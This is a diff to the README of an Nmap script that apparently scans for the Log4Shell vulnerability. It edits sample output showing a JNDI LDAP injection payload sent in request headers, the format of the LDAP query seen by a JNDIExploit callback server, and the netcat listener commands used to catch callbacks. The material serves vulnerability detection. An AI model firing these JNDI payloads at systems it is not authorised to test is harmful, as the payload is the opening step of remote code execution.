@@ -31,7 +31,7 @@ Copy the provided script (log4shell.nse) into that directory run `nmap --script-
     PORT     STATE SERVICE
     8080/tcp open  http-proxy
     | log4shell: 
-    |   Payload: ${jndi:ldap:/172.17.42.1:389/log4shell/172.17.42.2/8080}
+    |   Payload: ${jndi:ldap:/172.17.42.1:389/log4shell}
     |   Path: /
     |   Method: GET
     |   Headers: 
@@ -95,16 +95,17 @@ Run Nmap with --script log4shell.nse script
 
     nmap --script log4shell.nse [--script-args log4shell.callback-server=127.0.0.1:1389] [-p <port>] <target>
 
-See JNDIExploit output for see the received LDAP query (log4shell/{target host}/{target port})
+See JNDIExploit output for see the received LDAP query
 
-    [+] Received LDAP Query: log4shell/127.0.0.1/8080
-    [!] Invalid LDAP Query: log4shell/127.0.0.1/8080
+    [+] Received LDAP Query: log4shell
+    [!] Invalid LDAP Query: log4shell
 
 ### Method B:
 
 Listen a TCP port with netcat (or ncat):
 
-    ncat -v -k -e /bin/true -l 1389
+    ncat -vkl 1389   # Ncat
+    nc -lvnp 1389    # Netcat
 
 Run Nmap with --script log4shell.nse script
 
